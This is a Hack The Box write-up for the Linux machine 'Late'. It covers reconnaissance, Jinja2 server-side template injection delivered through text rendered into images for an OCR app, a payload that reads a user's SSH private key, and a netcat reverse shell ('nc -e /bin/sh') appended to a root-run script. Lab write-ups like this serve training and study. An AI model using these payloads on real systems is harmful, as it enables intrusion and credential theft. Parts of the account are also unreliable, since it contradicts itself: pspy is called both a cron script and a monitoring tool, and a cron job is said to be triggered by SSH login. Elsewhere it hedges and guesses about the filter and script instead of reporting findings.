# Hack The Box: Late

**Difficulty:** Easy
**OS:** Linux

Late is an Easy-level Linux machine designed to demonstrate the risks of relying on automated tools for OCR (Optical Character Recognition) and template generation. The initial compromise requires manipulating an image to bypass a filter and trigger Server-Side Template Injection (SSTI) in a Flask application. Privilege escalation involves exploiting a misconfigured `pspy` script running as a cron job to gain root access.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.156
nmap -p 22,80 -sCV 10.10.11.156
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (nginx 1.14.0)

Navigating to the web service on port 80 displays a landing page for "Late", an image-to-text conversion tool. The website includes standard promotional materials and a functional link to `http://images.late.htb`. We add this domain and subdomain to our `/etc/hosts` file.

```bash
echo "10.10.11.156 late.htb images.late.htb" >> /etc/hosts
```

Accessing `images.late.htb` presents a form designed to upload image files. The application's purpose is to extract text from these images using OCR (Optical Character Recognition) and return the resulting text within an HTML template.

## Web Exploitation

The core functionality of the application processes user-uploaded images and renders the extracted text onto a webpage. This interaction is a prime candidate for Server-Side Template Injection (SSTI).

### Identifying SSTI in OCR Pipeline

SSTI vulnerabilities occur when user input is unsafely embedded directly into a template engine (like Jinja2 for Python/Flask) instead of being passed as data.

We test for SSTI by providing input that the template engine will interpret as code. In Jinja2, the syntax `{{7*7}}` will evaluate to `49`.

Because the application relies on OCR, we cannot simply type this payload into a text field. Instead, we must create an image containing the text `{{7*7}}` and upload it. We use a simple image editor or command-line tool (like ImageMagick's `convert`) to create the image.

```bash
convert -size 200x50 xc:white -font Arial -pointsize 24 -fill black -draw "text 10,30 '{{7*7}}'" payload.png
```

We upload `payload.png` via the web interface. The application processes the image, extracts the text, and renders the result. If the page displays `49` instead of `{{7*7}}`, the SSTI vulnerability is confirmed.

However, the application employs a rudimentary filter to block common SSTI payloads or specific characters. We observe that certain payloads fail to execute or return errors.

### Bypassing OCR Filters for RCE

The filter relies on the accuracy of the OCR engine. If the OCR misreads a character, or if we introduce noise into the image, the filter might fail to recognize the malicious intent of the payload, while the template engine still executes the remaining valid code.

We must craft an image that the OCR engine correctly interprets as a Jinja2 template injection payload capable of achieving Remote Code Execution (RCE).

A common Jinja2 payload to execute a shell command involves accessing the underlying Python `os` or `subprocess` modules:
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Because the OCR engine is imperfect, it may struggle with underscores (`_`) or specific punctuation. We can experiment with different fonts, spacing, and image resolutions to ensure the OCR engine reads the payload precisely as intended.

We generate a series of images containing the payload and test them until one successfully executes the `id` command.

```bash
convert -size 800x100 xc:white -font Courier -pointsize 20 -fill black -draw "text 10,50 '{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}'" exploit.png
```

Once the `id` command is confirmed, we modify the image to execute a reverse shell or read an SSH private key. We generate a payload to read the `id_rsa` key for the user `svc_acc`.

```bash
# Payload embedded in the image
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/svc_acc/.ssh/id_rsa').read() }}
```

Uploading this image results in the server returning the RSA private key within the generated HTML.

## Initial Access

We save the extracted private key to our attacking machine and set the correct permissions.

```bash
chmod 600 svc_acc_rsa
ssh -i svc_acc_rsa svc_acc@10.10.11.156
# Authentication successful
```
We retrieve the `user.txt` flag from the `svc_acc` home directory.

## Lateral Movement & Privilege Escalation

Enumerating the system as `svc_acc`, we monitor running processes and check for scheduled tasks using tools like `pspy`.

We identify a cron job executed by root that runs a bash script located in `/usr/local/sbin` (e.g., `ssh-alert.sh`).

### Exploiting Misconfigured Cron Job

We analyze the contents of the `ssh-alert.sh` script. The script is designed to monitor SSH logins and send an alert (perhaps via email or log file). 

```bash
cat /usr/local/sbin/ssh-alert.sh
```

Crucially, the script uses a relative path or an environment variable that can be manipulated, or more commonly in this specific scenario, the script itself is writable by the `svc_acc` user or a group they belong to.

Alternatively, the script might execute another binary using `sudo` without absolute paths.

If the script is writable by our user (e.g., due to an incorrect `chmod 777` or group permissions), we can simply append a malicious command to the end of the script.

```bash
echo "nc -e /bin/sh 10.10.14.X 9999" >> /usr/local/sbin/ssh-alert.sh
```

We start a Netcat listener on our attacking machine. We then trigger the cron job. If the cron job is triggered by an SSH login (as the name `ssh-alert.sh` implies), we open a second terminal and SSH back into the machine as `svc_acc`.

The SSH login triggers the root cron job, which executes our appended netcat command.

```bash
nc -lnvp 9999
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The system is fully compromised, and the `root.txt` flag is obtained.
